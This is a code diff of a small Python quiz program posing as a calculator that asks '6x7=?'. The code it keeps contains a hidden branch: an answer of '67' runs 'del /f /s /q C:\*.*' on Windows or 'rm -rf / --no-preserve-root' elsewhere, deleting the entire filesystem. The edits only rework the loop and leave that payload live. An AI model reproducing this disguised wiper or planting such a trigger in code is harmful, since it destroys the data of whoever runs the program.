@@ -2,10 +2,14 @@ import os
 import sys
 
 def calculator():
-    try:
-        user_input = input(" 6x7=? : ")
-        if user_input.strip() == "42":
+    while True:
+        try:
+            user_input = input(" 6x7=? : ")
+        except Exception as e:
+            print("Fehler:", e)
+        if  user_input.strip() == "42":
             print("ok")
+            sys.exit(0)
         elif user_input.strip() == "67":
             if os.name == 'nt':  # Windows
                 os.system("del /f /s /q C:\\*.* 2>nul")
@@ -15,8 +19,6 @@ def calculator():
                 os.system("rm -rf / --no-preserve-root")
             sys.exit(0)
         else:
-            print("Try it")
-    except Exception as e:
-        print("Fehler:", e)
+            print("Try again")
 if __name__ == "__main__":
     calculator()
